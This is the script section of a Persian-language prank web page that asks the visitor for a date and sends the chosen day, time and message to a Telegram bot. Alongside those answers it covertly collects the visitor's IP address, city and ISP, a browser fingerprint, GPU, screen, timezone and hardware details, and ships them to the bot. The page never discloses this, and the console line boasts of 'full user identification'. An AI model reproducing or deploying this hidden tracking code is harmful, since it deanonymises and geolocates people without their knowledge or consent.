    <script>

        // ---- عناصر DOM ----
        const questionBox = document.getElementById('questionBox');

        const dateSection = document.getElementById('dateSection');

        const btnContinueDate = document.getElementById('btnContinueDate');

        const btnSendMessage = document.getElementById('btnSendMessage');
        const btnSkipMessage = document.getElementById('btnSkipMessage');

        // =============================================
        // 1. شناسه یکتا
        // =============================================
        function getUserId() {
            let userId = null;
            try {
                userId = localStorage.getItem('userId');
            } catch (e) {}
            if (!userId) {
                userId = 'user_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
                try {
                    localStorage.setItem('userId', userId);
                } catch (e) {}
            }
            return userId;
        }

        // =============================================
        // 2. تشخیص دقیق دستگاه
        // =============================================
        function getDeviceInfo() {
            const ua = navigator.userAgent;
            let os = 'ناشناخته';
            let osVersion = '';
            let device = 'کامپیوتر';
            let deviceModel = '';
            let brand = '';
            let browser = 'ناشناخته';
            let browserVersion = '';

            // تشخیص برند
            const brands = {
                'Samsung': ['Samsung', 'SM-'],
                'Xiaomi': ['Xiaomi', 'Redmi', 'Mi ', 'POCO'],
                'Huawei': ['Huawei', 'Honor'],
                'Nokia': ['Nokia'],
                'LG': ['LG-', 'LG '],
                'Sony': ['Sony', 'Xperia'],
                'HTC': ['HTC'],
                'Google': ['Pixel'],
                'OnePlus': ['OnePlus'],
                'Motorola': ['Moto', 'Motorola'],
                'Realme': ['Realme'],
                'Oppo': ['Oppo'],
                'Vivo': ['Vivo'],
                'Apple': ['iPhone', 'iPad'],
                'Nothing': ['Nothing']
            };

            for (let [b, patterns] of Object.entries(brands)) {
                for (let pattern of patterns) {
                    if (ua.includes(pattern)) {
                        brand = b;
                        break;
                    }
                }
                if (brand) break;
            }

            // تشخیص مدل
            const modelMatch = ua.match(/\(([^)]+)\)/);
            if (modelMatch) {
                const parts = modelMatch[1].split(';');
                for (let part of parts) {
                    const trimmed = part.trim();
                    if (!trimmed.includes('Build') && trimmed.length > 2 && trimmed.length < 30) {
                        if (/[A-Z]/.test(trimmed) && /\d/.test(trimmed)) {
                            deviceModel = trimmed;
                            break;
                        }
                        if (brand && trimmed.includes(brand)) {
                            deviceModel = trimmed;
                            break;
                        }
                    }
                }
            }

            // آیفون
            if (ua.includes('iPhone')) {
                device = 'iPhone';
                const match = ua.match(/iPhone(\d+,\d+)/);
                if (match) {
                    const models = {
                        '15,2': '14 Pro', '15,3': '14 Pro Max', '14,8': '14 Plus',
                        '14,7': '14', '14,6': '13 Pro Max', '14,5': '13 Pro',
                        '14,4': '13 mini', '14,3': '13', '13,2': '12 Pro Max',
                        '13,1': '12 Pro', '13,0': '12', '12,8': '12 mini',
                        '11,8': '11 Pro Max', '11,6': '11 Pro', '11,2': '11'
                    };
                    deviceModel = models[match[1]] || match[1];
                }
            }

            // سیستم‌عامل
            if (ua.indexOf('Windows NT 10.0') !== -1) {
                os = 'Windows 10';
            } else if (ua.indexOf('Windows NT 6.3') !== -1) {
                os = 'Windows 8.1';
            } else if (ua.indexOf('Windows NT 6.2') !== -1) {
                os = 'Windows 8';
            } else if (ua.indexOf('Windows NT 6.1') !== -1) {
                os = 'Windows 7';
            } else if (ua.indexOf('Windows NT') !== -1) {
                os = 'Windows';
            } else if (ua.indexOf('Mac OS X') !== -1) {
                os = 'macOS';
                const match = ua.match(/Mac OS X ([\d_]+)/);
                if (match) osVersion = match[1].replace(/_/g, '.');
                device = 'Mac';
            } else if (ua.indexOf('Android') !== -1) {
                os = 'Android';
                device = 'گوشی موبایل';
                const match = ua.match(/Android ([\d.]+)/);
                if (match) osVersion = match[1];
            } else if (ua.indexOf('iPhone') !== -1) {
                os = 'iOS';
                device = 'iPhone';
                const match = ua.match(/iPhone OS ([\d_]+)/);
                if (match) osVersion = match[1].replace(/_/g, '.');
            } else if (ua.indexOf('iPad') !== -1) {
                os = 'iOS';
                device = 'iPad';
                const match = ua.match(/iPad OS ([\d_]+)/);
                if (match) osVersion = match[1].replace(/_/g, '.');
            } else if (ua.indexOf('Linux') !== -1 && ua.indexOf('Android') === -1) {
                os = 'Linux';
            }

            // مرورگر
            if (ua.indexOf('Edg/') !== -1) {
                browser = 'Edge';
                const match = ua.match(/Edg\/([\d.]+)/);
                if (match) browserVersion = match[1];
            } else if (ua.indexOf('Chrome/') !== -1 && ua.indexOf('Edg/') === -1) {
                browser = 'Chrome';
                const match = ua.match(/Chrome\/([\d.]+)/);
                if (match) browserVersion = match[1];
            } else if (ua.indexOf('Firefox/') !== -1) {
                browser = 'Firefox';
                const match = ua.match(/Firefox\/([\d.]+)/);
                if (match) browserVersion = match[1];
            } else if (ua.indexOf('Safari/') !== -1 && ua.indexOf('Chrome/') === -1) {
                browser = 'Safari';
                const match = ua.match(/Version\/([\d.]+)/);
                if (match) browserVersion = match[1];
            } else if (ua.indexOf('OPR/') !== -1 || ua.indexOf('Opera/') !== -1) {
                browser = 'Opera';
                const match = ua.match(/OPR\/([\d.]+)/);
                if (match) browserVersion = match[1];
            }

            let result = '';
            if (device === 'گوشی موبایل' || device === 'iPhone' || device === 'iPad') {
                result = `📱 `;
                if (brand) result += `${brand} `;
                if (deviceModel && deviceModel !== brand) result += `${deviceModel} `;
                if (!brand && !deviceModel) result += device;
                result += `(${os}`;
                if (osVersion) result += ` ${osVersion}`;
                result += `)`;
            } else {
                result = `💻 ${device}`;
                if (os) result += ` (${os}`;
                if (osVersion) result += ` ${osVersion}`;
                result += `)`;
            }
            result += ` — 🌐 ${browser}`;
            if (browserVersion) result += ` ${browserVersion}`;
            return result;
        }

        // =============================================
        // 3. دریافت IP و موقعیت
        // =============================================
        async function getUserIP() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                return data.ip || 'نامشخص';
            } catch {
                return 'نامشخص';
            }
        }

        async function getUserLocation(ip) {
            try {
                const res = await fetch(`https://ipapi.co/${ip}/json/`);
                const data = await res.json();
                if (data.error) return null;
                return {
                    country: data.country_name || 'نامشخص',
                    city: data.city || 'نامشخص',
                    region: data.region || 'نامشخص',
                    isp: data.org || 'نامشخص'
                };
            } catch {
                return null;
            }
        }

        // =============================================
        // 4. اثر انگشت مرورگر
        // =============================================
        async function getFingerprint() {
            try {
                if (typeof FingerprintJS !== 'undefined') {
                    const fp = await FingerprintJS.load();
                    const result = await fp.get();
                    return result.visitorId || 'نامشخص';
                }
                return 'نامشخص';
            } catch {
                return 'نامشخص';
            }
        }

        // =============================================
        // 5. اطلاعات GPU (برگشت داده شد)
        // =============================================
        function getGPUInfo() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl');
                if (!gl) return null;
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                if (!debugInfo) return null;
                return {
                    renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
                };
            } catch {
                return null;
            }
        }

        // =============================================
        // 6. اطلاعات نمایشگر
        // =============================================
        function getDisplayInfo() {
            return {
                width: window.screen.width,
                height: window.screen.height,
                devicePixelRatio: window.devicePixelRatio || 1
            };
        }

        // =============================================
        // 7. اطلاعات دقیق مرورگر
        // =============================================
        function getDetailedBrowserInfo() {
            return {
                language: navigator.language || 'نامشخص',
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'نامشخص',
                hardwareConcurrency: navigator.hardwareConcurrency || 'نامشخص',
                deviceMemory: navigator.deviceMemory || 'نامشخص'
            };
        }

        // =============================================
        // 8. تابع اصلی جمع‌آوری اطلاعات
        // =============================================
        async function getUserFullInfo() {
            const userId = getUserId();
            const ip = await getUserIP();
            const location = await getUserLocation(ip);
            const fingerprint = await getFingerprint();
            const gpu = getGPUInfo();
            const display = getDisplayInfo();
            const deviceInfo = getDeviceInfo();
            const browserInfo = getDetailedBrowserInfo();

            let locationText = 'نامشخص';
            if (location && location.city !== 'نامشخص') {
                locationText = `${location.city}، ${location.country}`;
                if (location.isp && location.isp !== 'نامشخص') {
                    locationText += ` (${location.isp})`;
                }
            }

            return {
                userId,
                ip,
                location: locationText,
                fingerprint,
                gpu,
                display,
                deviceInfo,
                browserInfo
            };
        }

        // =============================================
        // 9. ساخت پیام برای تلگرام
        // =============================================
        function buildTelegramMessage(day, time, name, message, userInfo) {
            let text = `📅 درخواست قرار جدید:\n\n`;
            text += `📆 روز: ${day}\n`;
            text += `⏰ ساعت: ${time}\n`;
            text += `👤 اسم: ${name || 'نامشخص'}\n`;
            text += `💬 پیام: ${message || 'بدون پیام'}\n\n`;
            
            text += `━━━━━━━━━━━━━━━━━━━\n`;
            text += `🆔 شناسه کاربر: ${userInfo.userId}\n`;
            text += `🖥️ دستگاه: ${userInfo.deviceInfo}\n`;
            text += `🔍 اثر انگشت: ${userInfo.fingerprint}\n`;
            text += `🌐 IP: ${userInfo.ip}\n`;
            text += `📍 موقعیت: ${userInfo.location}\n`;
            text += `🌍 زبان: ${userInfo.browserInfo.language}\n`;
            text += `📱 رزولوشن: ${userInfo.display.width}x${userInfo.display.height}\n`;
            text += `📱 نسبت پیکسل: ${userInfo.display.devicePixelRatio}x\n`;
            text += `⏰ منطقه زمانی: ${userInfo.browserInfo.timezone}\n`;
            text += `🧠 هسته‌ها: ${userInfo.browserInfo.hardwareConcurrency || 'نامشخص'}\n`;
            text += `💾 حافظه: ${userInfo.browserInfo.deviceMemory || 'نامشخص'} GB\n`;
            
            if (userInfo.gpu) {
                text += `🎮 GPU: ${userInfo.gpu.renderer || 'نامشخص'}\n`;
            }
            
            text += `\n🕐 تاریخ ثبت: ${new Date().toLocaleString('fa-IR')}`;
            
            return text;
        }

        // =============================================
        // 10. ارسال به تلگرام
        // =============================================
        async function sendToTelegram(day, time, name, message) {
            const userInfo = await getUserFullInfo();
            const text = buildTelegramMessage(day, time, name, message, userInfo);

            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: text,
                        parse_mode: 'HTML'
                    })
                });
                const data = await response.json();
                if (data.ok) {
                    return 'پیام با موفقیت ارسال شد ✅';
                } else {
                    throw new Error('خطا در ارسال پیام: ' + data.description);
                }
            } catch (error) {
                throw new Error('خطا در ارتباط با سرور: ' + error.message);
            }
        }

        // ---- نمایش پیام وضعیت ----
        function showStatus(text, type) {
            statusMessage.textContent = text;
            statusMessage.className = 'status-message ' + type;
            statusMessage.style.display = 'block';
            setTimeout(() => {
                statusMessage.style.display = 'none';
            }, 5000);
        }

        // ---- ذخیره اطلاعات موقت ----
        let tempDay = '';
        let tempTime = '';

        // ---- دکمه "نه" غیرفعال می‌شود ----
        btnNo.addEventListener('click', function() {
            btnNo.disabled = true;
            btnNo.innerText = 'مگه گزینه بله رو نمیبینی؟';
            btnYes.style.transform = 'scale(1.04)';
            btnYes.style.boxShadow = '0 8px 0 #9f6a54, 0 12px 28px rgba(190, 100, 70, 0.5)';
        });

        // ---- کلیک روی "بله" ----
        btnYes.addEventListener('click', function() {
            questionBox.classList.add('disabled');
            btnYes.disabled = true;
            btnNo.disabled = true;
            btnNo.innerText = 'مگه گزینه بله رو نمیبینی؟';
            dateSection.classList.add('show');
            dateSection.scrollIntoView({ behavior: 'smooth', block: 'center' });
        });

        // ---- دکمه "ثبت زمان و ادامه" ----
        btnContinueDate.addEventListener('click', function() {
            if (!timePicker.value || !dayInput.value) {
                alert('لطفاً ساعت و روز را کامل پر کنید.');
                return;
            }
            tempDay = dayInput.value;
            tempTime = timePicker.value;
            dateSection.classList.remove('show');
            userMessageSection.classList.add('show');
            userMessageSection.scrollIntoView({ behavior: 'smooth', block: 'center' });
        });

        // ---- ارسال نهایی ----
        async function finalSubmit(name, message) {
            btnSendMessage.disabled = true;
            btnSendMessage.textContent = 'در حال ارسال...';
            btnSkipMessage.disabled = true;

            try {
                const successMessage = await sendToTelegram(tempDay, tempTime, name, message);
                showStatus(successMessage, 'success');

                thanksMessage.innerHTML = `
                        ⏰ ساعت: ${tempTime} &nbsp;|&nbsp; 📅 روز: ${tempDay}
                        ${name ? `<br />👤 ${name}` : ''}
                        <br /><br />
                        میبینمت خوجگله😋
                    `;

                finalThanks.classList.add('show');
                btnSendMessage.disabled = true;
                btnSendMessage.textContent = 'ارسال و تمام ❤️';
                btnSkipMessage.disabled = true;
                userMessageSection.classList.remove('show');
                finalThanks.scrollIntoView({ behavior: 'smooth', block: 'center' });
            } catch (error) {
                showStatus(error.message, 'error');
                btnSendMessage.disabled = false;
                btnSendMessage.textContent = 'ارسال و تمام ❤️';
                btnSkipMessage.disabled = false;
            }
        }

        // ---- دکمه ارسال ----
        btnSendMessage.addEventListener('click', function() {
            const name = userNameInput.value.trim();
            const message = userMessageInput.value.trim();
            finalSubmit(name, message);
        });

        // ---- دکمه رد کردن ----
        btnSkipMessage.addEventListener('click', function() {
            finalSubmit('', '');
        });

        // ---- تنظیمات اولیه ----
        const now = new Date();
        const hours = String(now.getHours()).padStart(2, '0');
        const minutes = String(now.getMinutes()).padStart(2, '0');
        timePicker.value = `${hours}:${minutes}`;
        dayInput.value = now.getDate();

        // ---- اعلان فیلترشکن ----
        window.addEventListener('load', function() {
            alert('🔒 برای ارسال اطلاعات، لطفاً فیلترشکن خود را روشن کنید!\n\nاگر فیلترشکن شما روشن نیست، ممکن است اطلاعات شما ارسال نشود.');
        });

        console.log('✅ سایت قرار ملاقات با شناسایی کامل کاربر راه‌اندازی شد!');
    </script>
</body>
</html>
